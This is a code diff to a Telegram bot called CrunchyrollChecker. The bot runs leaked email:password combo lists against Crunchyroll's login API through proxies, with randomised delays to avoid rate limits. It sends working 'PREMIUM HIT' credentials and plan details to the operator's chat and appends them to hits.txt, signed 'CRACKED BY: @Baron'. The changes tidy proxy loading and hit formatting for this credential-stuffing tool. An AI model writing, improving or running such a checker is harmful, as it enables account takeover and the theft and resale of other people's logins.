@@ -76,7 +76,7 @@ class CrunchyrollChecker:
             if proxy:
                 session.proxies.update(proxy)
 
-            # === Your original login ===
+            # === Your original login code ===
             url = "https://beta-api.crunchyroll.com/auth/v1/token"
             headers = {
                 'host': 'beta-api.crunchyroll.com',
@@ -172,6 +172,7 @@ class CrunchyrollChecker:
 async def send_result(chat_id, result):
     if result['status'] == 'PREMIUM':
         capture = f"""
+{'='*70}
 EMAIL: {result['email']}
 PASSWORD: {result['password']}
 STATUS: {result['status']}
@@ -185,10 +186,12 @@ EXPIRY: {result.get('expiry', 'N/A')}
 PLAN DURATION: {result.get('plan_duration', 'N/A')}
 ACTIVE: {result.get('active', 'N/A')}
 COUNTRY: {result.get('country', 'N/A')}
+CRACKED BY: @Baron
+{'='*70}
 """
         await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
         with open("hits.txt", "a", encoding="utf-8") as f:
-            f.write("="*70 + capture + "="*70 + "\n\n")
+            f.write(capture + "\n")
     elif result['status'] == 'FREE':
         await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
     else:
@@ -199,14 +202,14 @@ COUNTRY: {result.get('country', 'N/A')}
 async def start(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS:
         return
-    await message.answer("✅ Bot ready.\n\nSend /proxies to upload proxy file\nUse /check for combos (small batches only)")
+    await message.answer("✅ Bot ready.\nSend /proxies to load proxies\nUse /check for combos (small batches only)")
 
 
 @dp.message(Command("proxies"))
-async def load_proxies(message: types.Message):
+async def proxies_cmd(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS:
         return
-    await message.answer("📤 Send your proxy file (.txt) now.\nFormat: ip:port or user:pass@ip:port")
+    await message.answer("📤 Send proxy file or paste proxies (one per line)")
 
 
 @dp.message(F.document | F.text)
@@ -216,26 +219,27 @@ async def handle(message: types.Message):
 
     global checker
 
-    if message.document:
-        if "proxy" in message.document.file_name.lower() or message.reply_to_message and "/proxies" in message.reply_to_message.text.lower():
+    # Proxy loading
+    if message.document or message.text.startswith("/proxies"):
+        if message.document:
             file = await bot.get_file(message.document.file_id)
             content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
-            global proxies
-            proxies = [line.strip() for line in content.splitlines() if line.strip()]
-            checker.proxies = proxies
-            return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
         else:
-            file = await bot.get_file(message.document.file_id)
-            content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
-    else:
-        content = message.text.replace("/check", "").strip()
+            content = message.text.replace("/proxies", "").strip()
 
+        global proxies
+        proxies = [line.strip() for line in content.splitlines() if line.strip() and ":" in line]
+        checker.proxies = proxies
+        return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
+
+    # Combo checking
+    content = message.text.replace("/check", "").strip()
     lines = [line.strip() for line in content.splitlines() if ":" in line and "@" in line]
 
     if not lines:
         return await message.answer("No valid combos found.")
 
-    await message.answer(f"🚀 Starting check on {len(lines)} combos... (slow mode)")
+    await message.answer(f"🚀 Checking {len(lines)} combos... (slow mode)")
 
     for line in lines:
         try:
@@ -252,7 +256,7 @@ async def handle(message: types.Message):
 
             await send_result(message.from_user.id, result)
 
-            await asyncio.sleep(6.0 + random.uniform(1.0, 3.0))  # Slow delay
+            await asyncio.sleep(6.0 + random.uniform(1.0, 3.0))
 
         except:
             continue
